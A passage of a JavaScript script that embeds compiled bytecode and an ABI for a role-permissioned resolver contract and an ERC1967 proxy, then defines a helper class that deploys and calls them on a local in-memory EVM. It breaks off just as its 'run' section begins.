360dc1b81525081565b348015610757575f5ffd5b506102c8610766366004613405565b611d64565b348015610776575f5ffd5b506105ad6107853660046132a1565b611e4c565b348015610795575f5ffd5b506105ad6107a4366004613675565b611e62565b3480156107b4575f5ffd5b506104c56107c33660046132a1565b611eac565b3480156107d3575f5ffd5b506102c86107e236600461300d565b611ece565b3480156107f2575f5ffd5b506102c8610801366004613557565b611ee9565b348015610811575f5ffd5b5061031b61082036600461300d565b611f00565b348015610830575f5ffd5b5061085a61083f3660046132a1565b5f90815261010360205260409020546001600160401b031690565b6040516001600160401b0390911681526020016102d4565b34801561087d575f5ffd5b506102c861088c366004613557565b611f3c565b34801561089c575f5ffd5b5061070f6108ab3660046136a6565b611f5c565b3480156108bb575f5ffd5b5061031b6108ca3660046136e0565b611f68565b3480156108da575f5ffd5b506105ad6108e93660046132b8565b611ffc565b3480156108f9575f5ffd5b506105ad6109083660046130eb565b61201a565b348015610918575f5ffd5b506102c861092736600461313b565b612188565b348015610937575f5ffd5b506102c86109463660046134b5565b50600190565b5f639141311760e01b6001600160e01b03198316148061097c5750639061b92360e01b6001600160e01b03198316145b80610997575063582de3e760e01b6001600160e01b03198316145b806109b25750634fbf043360e01b6001600160e01b03198316145b806109cd5750631101d5ab60e11b6001600160e01b03198316145b806109e85750631d9dabef60e11b6001600160e01b03198316145b80610a0357506378e5bf0360e11b6001600160e01b03198316145b80610a1e575063bc1c58d160e01b6001600160e01b03198316145b80610a39575063ecbfada360e01b6001600160e01b03198316145b80610a5457506332f111d760e01b6001600160e01b03198316145b80610a6f57506304928c6760e21b6001600160e01b03198316145b80610a8a575063691f343160e01b6001600160e01b03198316145b80610aa5575063c869023360e01b6001600160e01b03198316145b80610ac05750631674750f60e21b6001600160e01b03198316145b80610adb575063d700ff3360e01b6001600160e01b03198316145b80610af6575063b0f3d36760e01b6001600160e01b03198316145b80610b11575063f41a143d60e01b6001600160e01b03198316145b80610b2c575063379ffb9360e11b6001600160e01b03198316145b80610b3b5750610b3b82612291565b92915050565b5f5f83610b4f8282336122c5565b610b5c5f86866001612300565b95945050505050565b84610ba485858080601f0160208091040260200160405190810160405280939291908181526020018383808284375f920191909152506123f792505050565b6010811580610bd95750610bc2610bbb8484612402565b8233611ee9565b158015610bd95750610bd7610bbb5f84612402565b155b15610bf257610bf2610beb845f612402565b8233612424565b8484610bfd8a612440565b6005018989604051610c10929190613710565b90815260200160405180910390209182610c2b929190613795565b508686604051610c3c929190613710565b6040518091039020887f448bc014f1536726cf8d54ff3d6481ed3cbc683c2591ca204274009afa09b1a189898989604051610c7a9493929190613876565b60405180910390a35050505050505050565b5f5f610c9884846111f6565b501515949350505050565b5f610cad83612440565b6001600160e01b031983165f90815260089190910160205260409020546001600160a01b0316905080610b3b575f610ce484611219565b9050610cf0818461246d565b15610cf9578091505b5092915050565b5f5f610d4088888080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201829052509250612488915050565b90506410000000005f610d538382612402565b90505f610d9d84610d988b8b8080601f0160208091040260200160405190810160405280939291908181526020018383808284375f920191909152506123f792505050565b612402565b90508515610e3357610db08284336122c5565b5f818152600160205260409020545f03610e1b578888604051610dd4929190613710565b6040518091039020817fdb7aa4f21d01358b79d5574f3f3f6805f4f97606c53cb70598063387352206ac8d8d8d8d604051610e129493929190613876565b60405180910390a35b610e288184896001612300565b945050505050610e4b565b610e3e8284336124b9565b610e2881848960016124ee565b9695505050505050565b5f60605f610e6285612440565b9050600192505b5f83118015610e785750838311155b15610f385782841615610f2c575f83815260078201602052604090208054610e9f9061371f565b80601f0160208091040260200160405190810160405280929190818152602001828054610ecb9061371f565b8015610f165780601f10610eed57610100808354040283529160200191610f16565b820191905f5260205f20905b815481529060010190602001808311610ef957829003601f168201915b505050505091505f82511115610f2c5750610f4c565b600183901b9250610e69565b505060408051602081019091525f80825291505b9250929050565b6310000000610f635f8233612424565b82826101025f610fa789898080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201829052509250612488915050565b81526020019081526020015f209182610fc1929190613795565b508282604051610fd2929190613710565b60405180910390208585604051610fea929190613710565b60405180910390207fa8c2ea0876733fd2146051b3e195e5e1d1f85eff08bf169191dce9569281c529878787876040516110279493929190613876565b60405180910390a35050505050565b825f611000611048610beb845f612402565b60405180604001604052808681526020018581525061106687612440565b600101906002611077929190612f79565b50604080518681526020810186905287917f1d6f5e03d3f63eb58751986629a5439baee5079ff04f345becb66e23eb154e4691015b60405180910390a2505050505050565b825f6101006110ce610beb845f612402565b84846110d988612440565b916110e5919083613795565b50857fe379c1624ed7e714cc0937528a32359d69d5281337765313dba4e081b72d757886866040516110ac92919061389c565b5f5f61112384612440565b5f84815260049190910160205260409020805461113f9061371f565b905011905092915050565b805f64010000000061115f610beb845f612402565b5f8481526101036020526040812080548290611183906001600160401b03166138c3565b91906101000a8154816001600160401b0302191690836001600160401b0316021790559050847fc6621ccb8f3f5a04bb6502154b2caf6adf5983fe76dfef1cfc9c42e3579db444826040516111e791906001600160401b0391909116815260200190565b60405180910390a25050505050565b5f5f61120183612556565b5f948552600160205260409094205484169492505050565b5f61122582603c61201a565b61122e906138ed565b60601c92915050565b8461127685858080601f0160208091040260200160405190810160405280939291908181526020018383808284375f920191909152506123f792505050565b6410000000008115806112a85750611291610bbb8484612402565b1580156112a857506112a6610bbb5f84612402565b155b156112ba576112ba610beb845f612402565b84846112c58a612440565b60060189896040516112d8929190613710565b908152602001604051809103902091826112f3929190613795565b508484604051611304929190613710565b6040518091039020878760405161131c929190613710565b6040518091039020897f3b7ea3580e046bf897ca24f2f45fcf5491dafba8d1b3dd17ca92aa0e82b4dd218a8a60405161135692919061389c565b60405180910390a45050505050505050565b611370612570565b61137982612616565b6113838282612626565b5050565b5f6113906126e2565b505f516020613c2e5f395f51905f5290565b5f5f6113e287878080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201829052509250612488915050565b905060015f6113f18382612402565b90505f61140784610d988a5f9081526020902090565b905085156114825761141a8284336122c5565b5f818152600160205260409020545f0361146a5787817f2fe6caf984256b1a1844b92f52cf88703e829b07ce397a6c7fcf1f779db7a1858c8c60405161146192919061389c565b60405180910390a35b6114778184896001612300565b945050505050610b5c565b61148d8284336124b9565b61147781848960016124ee565b60606114a584612440565b60050183836040516114b8929190613710565b908152602001604051809103902080546114d19061371f565b80601f01602080910402602001604051908101604052809291908181526020018280546114fd9061371f565b80156115485780601f1061151f57610100808354040283529160200191611548565b820191905f5260205f20905b81548152906001019060200180831161152b57829003601f168201915b505050505090505b9392505050565b5f611550838361272b565b835f62010000611575610beb845f612402565b61157e86612750565b6115a357604051632ba15d9360e11b8152600481018790526024015b60405180910390fd5b84846115ae89612440565b5f89815260079190910160205260409020916115cb919083613795565b50604051869088907faa121bbeef5f32f5961a2a28966e769023910fc9479059ee3495d4c1a696efe3905f90a350505050505050565b606061160c82612440565b600301805461161a9061371f565b80601f01602080910402602001604051908101604052809291908181526020018280546116469061371f565b80156116915780601f1061166857610100808354040283529160200191611691565b820191905f5260205f20905b81548152906001019060200180831161167457829003601f168201915b50505050509050919050565b5f610b3b600160781b8361181e565b5f6116b561276f565b805490915060ff600160401b82041615906001600160401b03165f811580156116db5750825b90505f826001600160401b031660011480156116f65750303b155b905081158015611704575080155b156117225760405163f92ee8a960e01b815260040160405180910390fd5b845467ffffffffffffffff19166001178555831561174c57845460ff60401b1916600160401b1785555b611754612797565b6117605f898b5f612300565b5061176b8787611c5e565b5083156117b257845460ff60401b19168555604051600181527fc7f505b2f371ae2175ee4913f4499e1f2633a7b5936321eed1cdaeb6115181d29060200160405180910390a15b505050505050505050565b825f63010000006117d1610beb845f612402565b84846117dc88612440565b600301916117eb919083613795565b50857fb7d29e911041e8d9b843369e890bcb72c9388692ba48b65ac54e7214c4c348f786866040516110ac92919061389c565b5f828361182b5f8561272b565b16149392505050565b5f83838360405163d1a3b35560e01b815260040161159a93929190613940565b5f828152602090208390600181158061188c5750611875610bbb8484612402565b15801561188c575061188a610bbb5f84612402565b155b1561189e5761189e610beb845f612402565b8351158015906118b057508351601414155b80156118c057506118c08561279f565b156118e0578360405163046b337b60e51b815260040161159a919061346d565b836118ea87612440565b5f8781526004919091016020526040902090611906908261395f565b50857f65412581168e88a1e60c6459d7f44ae83ad0832e670826c05a4e2476b57af75286866040516119399291906131f6565b60405180910390a2603c850361198757857f52d7d861f09ab3d26239d492e8968629f95e9e318cf0b73bfddc441522a15fd2611974866138ed565b60405160609190911c81526020016110ac565b505050505050565b60605f6119d086868080601f0160208091040260200160405190810160405280939291908181526020018383808284375f92019190915250611e6292505050565b90505f611a2a8585611a2585515f146119e95785611a1f565b8a8a8080601f0160208091040260200160405190810160405280939291908181526020018383808284375f920191909152505050505b5f612488565b6127c4565b9050631592ca1b60e31b611a3d82613a19565b6001600160e01b03191603611baa578051600319810160048301908152915f91611a709190810160200190602401613a53565b90505f5b8151811015611b7f57818181518110611a8f57611a8f613b4e565b602002602001015192505f306001600160a01b031684604051611ab29190613b62565b5f60405180830381855afa9150503d805f8114611aea576040519150601f19603f3d011682016040523d82523d5f602084013e611aef565b606091505b5091505080515f03611b5857637b1c461b60e01b611b0c85613a19565b6040516001600160e01b0319909116602482015260440160408051601f198184030181529190526020810180516001600160e01b03166001600160e01b03199093169290921790915290505b80838381518110611b6b57611b6b613b4e565b602090810291909101015250600101611a74565b5080604051602001611b919190613612565b6040516020818303038152906040529350505050611c56565b5f5f306001600160a01b031683604051611bc49190613b62565b5f60405180830381855afa9150503d805f8114611bfc576040519150601f19603f3d011682016040523d82523d5f602084013e611c01565b606091505b509150915081611c1357805160208201fd5b80515f03611c4b57611c258688613b78565b604051637b1c461b60e01b81526001600160e01b0319909116600482015260240161159a565b9350611c5692505050565b949350505050565b6060816001600160401b03811115611c7857611c786132ff565b604051908082528060200260200182016040528015611cab57816020015b6060815260200190600190039081611c965790505b5090505f5b82811015610cf9575f8030868685818110611ccd57611ccd613b4e565b9050602002810190611cdf9190613bae565b604051611ced929190613710565b5f60405180830381855af49150503d805f8114611d25576040519150601f19603f3d011682016040523d82523d5f602084013e611d2a565b606091505b509150915081611d3c57805160208201fd5b80848481518110611d4f57611d4f613b4e565b60209081029190910101525050600101611cb0565b5f5f611da487878080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201829052509250612488915050565b90505f611db18282612402565b90508315611e3457611dc48187336122c5565b8015801590611dde57505f81815260016020526040902054155b15611e1e57807f737038e72be1d204e2c7336c20bff2169d9dffe11face28c5969af4ecce04f678989604051611e1592919061389c565b60405180910390a25b611e2b8187876001612300565b92505050610b5c565b611e3f8187336124b9565b611e2b81878760016124ee565b6060611e5782612440565b805461161a9061371f565b60605f5b6060611e71846128a1565b80519095509091505f03611e855750611ea6565b80516020820120828103611e9a575050611ea6565b8493509150611e669050565b50919050565b5f5f5f611eb884612440565b6001810154600290910154909590945092505050565b5f5f83611edc8282336124b9565b610b5c5f868660016124ee565b5f8283611ef686856129ef565b1614949350505050565b6040516bffffffffffffffffffffffff19606083901b166020820152611383908390603c90603401604051602081830303815290604052611854565b5f8383836040516314c09c6360e31b815260040161159a93929190613940565b6060611c568383611c5e565b825f62100000611f7b610beb845f612402565b83611f8587612440565b6001600160e01b031987165f818152600892909201602090815260409283902080546001600160a01b0319166001600160a01b03958616179055915192871683529188917f7c69f06bea0bdef565b709e93a147836b0063ba2dd89f02d0b7e8d931e6a6daa910160405180910390a3505050505050565b606061200784612440565b60060183836040516114b8929190613710565b60605f61202684612440565b5f84815260048201602052604090208054919250906120449061371f565b80601f01602080910402602001604051908101604052809291908181526020018280546120709061371f565b80156120bb5780601f10612092576101008083540402835291602001916120bb565b820191905f5260205f20905b81548152906001019060200180831161209e57829003601f168201915b5050505050915081515f1480156120df57505f6120d784612a0c565b63ffffffff16115b15610cf95763800000005f908152600482016020526040902080546121039061371f565b80601f016020809104026020016040519081016040528092919081815260200182805461212f9061371f565b801561217a5780601f106121515761010080835404028352916020019161217a565b820191905f5260205f20905b81548152906001019060200180831161215d57829003601f168201915b505050505091505092915050565b5f5f6121c888888080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201829052509250612488915050565b905060105f6121d78382612402565b90505f61221c84610d988b8b8080601f0160208091040260200160405190810160405280939291908181526020018383808284375f920191909152506123f792505050565b90508515610e335761222f8284336122c5565b5f818152600160205260409020545f03610e1b578888604051612253929190613710565b6040518091039020817fab228e072dd20e63d6891264ea8f6a2459e6852ab494b707970f978ba630859c8d8d8d8d604051610e129493929190613876565b5f6001600160e01b031982166347a296b160e11b1480610b3b57506301ffc9a760e01b6001600160e01b0319831614610b3b565b5f6122d08483612a36565b905080198316156122fa5783838360405163d1a3b35560e01b815260040161159a93929190613940565b50505050565b5f835f0361230f57505f611c56565b61231884612a62565b6001600160a01b03831661233f5760405163761fe2c960e11b815260040160405180910390fd5b5f858152602081815260408083206001600160a01b03871684529091529020548481178082146123ed575f878152602081815260408083206001600160a01b038916845290915290208190558119861661239b88826001612aa9565b60408051848152602081018490526001600160a01b038816918a917f0d35bf721a39b614de00ca5038e1deb0cb0c69a278645e83405a7226cf80ba3c910160405180910390a360019350505050611c56565b5f92505050611c56565b805160209091012090565b5f8215158061241057508115155b15610b3b57505f9182526020526040902090565b61242c612b97565b61243b5761243b838383612bb0565b505050565b5f908152610104602090815260408083206101038352818420546001600160401b03168452909152902090565b5f61247783612bde565b801561155057506115508383612c10565b5f6124938383612c96565b925090508015610b3b576115506124aa8484612488565b825f9182526020526040902090565b5f6124c48483612a36565b905080198316156122fa578383836040516314c09c6360e31b815260040161159a93929190613940565b5f6124f884612a62565b5f858152602081815260408083206001600160a01b0387168452909152902054841981168082146123ed575f878152602081815260408083206001600160a01b038916845290915281208290558683169061239b9089908390612aa9565b5f61256082612a62565b50600181901b17600281901b1790565b306001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614806125f657507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166125ea5f516020613c2e5f395f51905f52546001600160a01b031690565b6001600160a01b031614155b156126145760405163703e46dd60e11b815260040160405180910390fd5b565b6001607c1b6113835f8233612424565b816001600160a01b03166352d1902d6040518163ffffffff1660e01b8152600401602060405180830381865afa925050508015612680575060408051601f3d908101601f1916820190925261267d91810190613bf0565b60015b6126a857604051634c9c8ce360e01b81526001600160a01b038316600482015260240161159a565b5f516020613c2e5f395f51905f5281146126d857604051632a87526960e21b81526004810182905260240161159a565b61243b8383612cc3565b306001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146126145760405163703e46dd60e11b815260040160405180910390fd5b5f918252602082815260408084206001600160a01b0393909316845291905290205490565b5f5f82118015610b3b575081612767600182613c07565b161592915050565b5f807ff0c57e16840df040f15088dc2f81fe391c3923bec73e23a9662efc9c229c6a00610b3b565b612614612d18565b5f6380000000821480610b3b57505f6127b783612a0c565b63ffffffff161192915050565b606083838080601f0160208091040260200160405190810160405280939291908181526020018383808284375f9201919091525092935061289392505050565b602481019050600481035160e01c63ac9650d88114612833578183101561282b5750505050565b8382526122fa565b815182019180831015612847575050505050565b825160051b5b8015611987576020840191508084015182018281101561286d575061288a565b805181018087101561287c5750855b612887888284612804565b50505b601f190161284d565b611550828251830183612804565b6060805f5b83518110156129e9576101025f6128bd8684612488565b81526020019081526020015f2080546128d59061371f565b80601f01602080910402602001604051908101604052809291908181526020018280546129019061371f565b801561294c5780601f106129235761010080835404028352916020019161294c565b820191905f5260205f20905b81548152906001019060200180831161292f57829003601f168201915b505050505092505f835111156129d65780156129ce57825161296e9082613c1a565b6001600160401b03811115612985576129856132ff565b6040519080825280601f01601f1916602001820160405280156129af576020820181803683370190505b5091508060208501602084015e8251602084018260200184015e6129e9565b8291506129e9565b6129e08482612d3d565b91506128a69050565b50915091565b5f6129fa838361272b565b612a045f8461272b565b179392505050565b5f603c8203612a1d57506001919050565b6380000000918218918210612a32575f610b3b565b5090565b5f611550612a4484846129ef565b6fffffffffffffffffffffffffffffffff19811660809190911c1790565b7feeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee811615612aa657604051630153d96960e51b81526004810182905260240161159a565b50565b5f612ab383612556565b90508115612b25575f84815260016020526040902054612ad590821619612dba565b15612afd57604051631f22ca6960e31b8152600481018590526024810184905260440161159a565b5f8481526001602052604081208054859290612b1a908490613c1a565b909155506122fa9050565b5f84815260016020526040902054612b409019821619612dba565b15612b6857604051631f80c19b60e01b8152600481018590526024810184905260440161159a565b5f8481526001602052604081208054859290612b85908490613c07565b909155505050505050565b5050505050565b5f612ba061276f565b54600160401b900460ff16919050565b612bbb838383611ee9565b61243b57828282604051634b27a13360e01b815260040161159a93929190613940565b5f612bf0826301ffc9a760e01b612c10565b8015610b3b5750612c09826001600160e01b0319612c10565b1592915050565b6040516001600160e01b0319821660248201525f90819060440160408051601f19818403018152919052602080820180516001600160e01b03166301ffc9a760e01b17815282519293505f9283928392909183918a617530fa92503d91505f519050828015612c80575060208210155b8015612c8b57505f81115b979650505050505050565b5f5f5f612ca38585612d3d565b9250905060ff811615612cbb57806021858701012092505b509250929050565b612ccc82612e09565b6040516001600160a01b038316907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b905f90a2805115612d105761243b8282612e6c565b611383612ed5565b612d20612b97565b61261457604051631afcd79f60e31b815260040160405180910390fd5b5f5f83518310612d62578360405163ba4adc2360e01b815260040161159a919061346d565b838381518110612d7457612d74613b4e565b016020015160f81c91505081810160010181612d94578351811415612d9a565b83518110155b15610f4c578360405163ba4adc2360e01b815260040161159a919061346d565b80197feeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeef91909101167f888888888888888888888888888888888888888888888888888888888888888816151590565b806001600160a01b03163b5f03612e3e57604051634c9c8ce360e01b81526001600160a01b038216600482015260240161159a565b5f516020613c2e5f395f51905f5280546001600160a01b0319166001600160a01b0392909216919091179055565b60605f5f846001600160a01b031684604051612e889190613b62565b5f60405180830381855af49150503d805f8114612ec0576040519150601f19603f3d011682016040523d82523d5f602084013e612ec5565b606091505b5091509150610b5c858383612ef4565b34156126145760405163b398979f60e01b815260040160405180910390fd5b606082612f0957612f0482612f50565b611550565b8151158015612f2057506001600160a01b0384163b155b15612f4957604051639996b31560e01b81526001600160a01b038516600482015260240161159a565b5080611550565b805115612f605780518082602001fd5b60405163d6bda27560e01b815260040160405180910390fd5b8260028101928215612fa7579160200282015b82811115612fa7578251825591602001919060010190612f8c565b50612a329291505b80821115612a32575f8155600101612faf565b80356001600160e01b031981168114612fd9575f5ffd5b919050565b5f60208284031215612fee575f5ffd5b61155082612fc2565b80356001600160a01b0381168114612fd9575f5ffd5b5f5f6040838503121561301e575f5ffd5b8235915061302e60208401612ff7565b90509250929050565b5f5f83601f840112613047575f5ffd5b5081356001600160401b0381111561305d575f5ffd5b602083019150836020828501011115610f4c575f5ffd5b5f5f5f5f5f60608688031215613088575f5ffd5b8535945060208601356001600160401b038111156130a4575f5ffd5b6130b088828901613037565b90955093505060408601356001600160401b038111156130ce575f5ffd5b6130da88828901613037565b969995985093965092949392505050565b5f5f604083850312156130fc575f5ffd5b50508035926020909101359150565b5f5f6040838503121561311c575f5ffd5b8235915061302e60208401612fc2565b80358015158114612fd9575f5ffd5b5f5f5f5f5f5f60808789031215613150575f5ffd5b86356001600160401b03811115613165575f5ffd5b61317189828a01613037565b90975095505060208701356001600160401b0381111561318f575f5ffd5b61319b89828a01613037565b90955093506131ae905060408801612ff7565b91506131bc6060880161312c565b90509295509295509295565b5f81518084528060208401602086015e5f602082860101526020601f19601f83011685010191505092915050565b828152604060208201525f611c5660408301846131c8565b5f5f5f5f60408587031215613221575f5ffd5b84356001600160401b03811115613236575f5ffd5b61324287828801613037565b90955093505060208501356001600160401b03811115613260575f5ffd5b61326c87828801613037565b95989497509550505050565b5f5f5f6060848603121561328a575f5ffd5b505081359360208301359350604090920135919050565b5f602082840312156132b1575f5ffd5b5035919050565b5f5f5f604084860312156132ca575f5ffd5b8335925060208401356001600160401b038111156132e6575f5ffd5b6132f286828701613037565b9497909650939450505050565b634e487b7160e01b5f52604160045260245ffd5b604051601f8201601f191681016001600160401b038111828210171561333b5761333b6132ff565b604052919050565b5f6001600160401b0382111561335b5761335b6132ff565b50601f01601f191660200190565b5f82601f830112613378575f5ffd5b813561338b61338682613343565b613313565b81815284602083860101111561339f575f5ffd5b816020850160208301375f918101602001919091529392505050565b5f5f604083850312156133cc575f5ffd5b6133d583612ff7565b915060208301356001600160401b038111156133ef575f5ffd5b6133fb85828601613369565b9150509250929050565b5f5f5f5f5f60808688031215613419575f5ffd5b85356001600160401b0381111561342e575f5ffd5b61343a88828901613037565b9096509450506020860135925061345360408701612ff7565b91506134616060870161312c565b90509295509295909350565b602081525f61155060208301846131c8565b5f5f5f5f60608587031215613492575f5ffd5b843593506020850135925060408501356001600160401b03811115613260575f5ffd5b5f602082840312156134c5575f5ffd5b61155082612ff7565b5f5f83601f8401126134de575f5ffd5b5081356001600160401b038111156134f4575f5ffd5b6020830191508360208260051b8501011115610f4c575f5ffd5b5f5f5f5f60608587031215613521575f5ffd5b61352a85612ff7565b93506020850135925060408501356001600160401b0381111561354b575f5ffd5b61326c878288016134ce565b5f5f5f60608486031215613569575f5ffd5b833592506020840135915061358060408501612ff7565b90509250925092565b5f5f5f6060848603121561359b575f5ffd5b833592506020840135915060408401356001600160401b038111156135be575f5ffd5b6135ca86828701613369565b9150509250925092565b5f5f602083850312156135e5575f5ffd5b82356001600160401b038111156135fa575f5ffd5b613606858286016134ce565b90969095509350505050565b5f602082016020835280845180835260408501915060408160051b8601019250602086015f5b8281101561366957603f198786030184526136548583516131c8565b94506020938401939190910190600101613638565b50929695505050505050565b5f60208284031215613685575f5ffd5b81356001600160401b0381111561369a575f5ffd5b611c5684828501613369565b5f5f5f604084860312156136b8575f5ffd5b8335925060208401356001600160401b038111156136d4575f5ffd5b6132f2868287016134ce565b5f5f5f606084860312156136f2575f5ffd5b8335925061370260208501612fc2565b915061358060408501612ff7565b818382375f9101908152919050565b600181811c9082168061373357607f821691505b602082108103611ea657634e487b7160e01b5f52602260045260245ffd5b601f82111561243b57805f5260205f20601f840160051c810160208510156137765750805b601f840160051c820191505b81811015612b90575f8155600101613782565b6001600160401b038311156137ac576137ac6132ff565b6137c0836137ba835461371f565b83613751565b5f601f8411600181146137f1575f85156137da5750838201355b5f19600387901b1c1916600186901b178355612b90565b5f83815260208120601f198716915b828110156138205786850135825560209485019460019092019101613800565b508682101561383c575f1960f88860031b161c19848701351681555b505060018560011b0183555050505050565b81835281816020850137505f828201602090810191909152601f909101601f19169091010190565b604081525f61388960408301868861384e565b8281036020840152612c8b81858761384e565b602081525f611c5660208301848661384e565b634e487b7160e01b5f52601160045260245ffd5b5f6001600160401b0382166001600160401b0381036138e4576138e46138af565b60010192915050565b805160208201516bffffffffffffffffffffffff19811691906014821015613939576bffffffffffffffffffffffff196bffffffffffffffffffffffff198360140360031b1b82161692505b5050919050565b92835260208301919091526001600160a01b0316604082015260600190565b81516001600160401b03811115613978576139786132ff565b61398c81613986845461371f565b84613751565b6020601f8211600181146139be575f83156139a75750848201515b5f19600385901b1c1916600184901b178455612b90565b5f84815260208120601f198516915b828110156139ed57878501518255602094850194600190920191016139cd565b5084821015613a0a57868401515f19600387901b60f8161c191681555b50505050600190811b01905550565b805160208201516001600160e01b0319811691906004821015613939576001600160e01b031960049290920360031b82901b161692915050565b5f60208284031215613a63575f5ffd5b81516001600160401b03811115613a78575f5ffd5b8201601f81018413613a88575f5ffd5b80516001600160401b03811115613aa157613aa16132ff565b8060051b613ab160208201613313565b91825260208184018101929081019087841115613acc575f5ffd5b6020850192505b83831015612c8b5782516001600160401b03811115613af0575f5ffd5b8501603f81018913613b00575f5ffd5b6020810151613b1161338682613343565b8181526040838301018b1015613b25575f5ffd5b8160408401602083015e5f60208383010152808552505050602082019150602083019250613ad3565b634e487b7160e01b5f52603260045260245ffd5b5f82518060208501845e5f920191825250919050565b80356001600160e01b03198116906004841015610cf9576001600160e01b031960049490940360031b84901b1690921692915050565b5f5f8335601e19843603018112613bc3575f5ffd5b8301803591506001600160401b03821115613bdc575f5ffd5b602001915036819003821315610f4c575f5ffd5b5f60208284031215613c00575f5ffd5b5051919050565b81810381811115610b3b57610b3b6138af565b80820180821115610b3b57610b3b6138af56fe360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbca2646970667358221220b4f2ff030688d00718ec6700341fe8f47baefe4945bf6a3710929808121cc23e64736f6c634300081c00338888888888888888888888888888888888888888888888888888888888888888eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeef'
const PROXY_ABI = [{"type":"constructor","inputs":[{"name":"implementation","type":"address","internalType":"address"},{"name":"_data","type":"bytes","internalType":"bytes"}],"stateMutability":"payable"},{"type":"fallback","stateMutability":"payable"},{"type":"event","name":"Upgraded","inputs":[{"name":"implementation","type":"address","indexed":true,"internalType":"address"}],"anonymous":false},{"type":"error","name":"AddressEmptyCode","inputs":[{"name":"target","type":"address","internalType":"address"}]},{"type":"error","name":"ERC1967InvalidImplementation","inputs":[{"name":"implementation","type":"address","internalType":"address"}]},{"type":"error","name":"ERC1967NonPayable","inputs":[]},{"type":"error","name":"FailedCall","inputs":[]}]
const PROXY_BYTECODE = '0x60806040526040516103d03803806103d08339810160408190526100229161023c565b61002c8282610033565b5050610321565b61003c82610091565b6040516001600160a01b038316907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b905f90a280511561008557610080828261010c565b505050565b61008d61017f565b5050565b806001600160a01b03163b5f036100cb57604051634c9c8ce360e01b81526001600160a01b03821660048201526024015b60405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80546001600160a01b0319166001600160a01b0392909216919091179055565b60605f5f846001600160a01b031684604051610128919061030b565b5f60405180830381855af49150503d805f8114610160576040519150601f19603f3d011682016040523d82523d5f602084013e610165565b606091505b5090925090506101768583836101a0565b95945050505050565b341561019e5760405163b398979f60e01b815260040160405180910390fd5b565b6060826101b5576101b0826101ff565b6101f8565b81511580156101cc57506001600160a01b0384163b155b156101f557604051639996b31560e01b81526001600160a01b03851660048201526024016100c2565b50805b9392505050565b80511561020f5780518082602001fd5b60405163d6bda27560e01b815260040160405180910390fd5b634e487b7160e01b5f52604160045260245ffd5b5f5f6040838503121561024d575f5ffd5b82516001600160a01b0381168114610263575f5ffd5b60208401519092506001600160401b0381111561027e575f5ffd5b8301601f8101851361028e575f5ffd5b80516001600160401b038111156102a7576102a7610228565b604051601f8201601f19908116603f011681016001600160401b03811182821017156102d5576102d5610228565b6040528181528282016020018710156102ec575f5ffd5b8160208401602083015e5f602083830101528093505050509250929050565b5f82518060208501845e5f920191825250919050565b60a38061032d5f395ff3fe6080604052600a600c565b005b60186014601a565b6050565b565b5f604b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc546001600160a01b031690565b905090565b365f5f375f5f365f845af43d5f5f3e8080156069573d5ff35b3d5ffdfea2646970667358221220955bf52eef4c7c923cb2a9ef95de251e8b69537428a4b83adc4bfc1fa292f86764736f6c634300081c0033'

// PermissionedResolverLib / EACBaseRolesLib, contracts-v2 @ 8d1c893.
const ROLE_SET_ADDR = 1n << 0n
const ROLE_SET_TEXT = 1n << 4n
const ALL_ROLES = 0x1111111111111111111111111111111111111111111111111111111111111111n

const GAS = 30_000_000n
const addr = (a) => new Address(hexToBytes(getAddress(a)))
class RevertError extends Error {}
const decodeRevert = (ret, abi) => {
  try {
    const d = decodeErrorResult({ abi, data: ret })
    return d.errorName + '(' + (d.args ?? []).map((a) =>
      typeof a === 'bigint' ? '0x' + a.toString(16) : String(a)).join(', ') + ')'
  } catch { return 'reverted ' + ret.slice(0, 10) }
}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }
  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Cancun }), stateManager: sm }), sm)
  }
  async fund(a, wei) {
    const acct = (await this.sm.getAccount(addr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(addr(a), acct)
  }
  async balance(a) { return (await this.sm.getAccount(addr(a)))?.balance ?? 0n }
  async deploy(from, bytecode, abi, args = []) {
    const ctor = abi.find((x) => x.type === 'constructor')
    const data = ctor && args.length
      ? bytecode + encodeAbiParameters(ctor.inputs, args).slice(2) : bytecode
    const res = await this.evm.runCall(
      { caller: addr(from), origin: addr(from), data: hexToBytes(data), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error('deploy reverted: ' + res.execResult.exceptionError.error)
    return res.createdAddress.toString()
  }
  async raw({ from, to, data, value = 0n, abi, fn }) {
    const res = await this.evm.runCall({ caller: addr(from), origin: addr(from), to: addr(to),
      data: hexToBytes(data), value, gasLimit: GAS })
    const ex = res.execResult
    const ret = '0x' + Buffer.from(ex.returnValue).toString('hex')
    if (ex.exceptionError) throw new RevertError(decodeRevert(ret, abi))
    const outs = abi?.find((x) => x.type === 'function' && x.name === fn)?.outputs
    if (!outs?.length) return undefined
    return decodeFunctionResult({ abi, functionName: fn, data: ret })
  }
  async send({ abi, fn, args = [], ...rest }) {
    return this.raw({ ...rest, abi, fn, data: encodeFunctionData({ abi, functionName: fn, args }) })
  }
  async call(opts) { return this.send({ ...opts, from: OPERATOR }) }
}

// ============================================================== run
const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
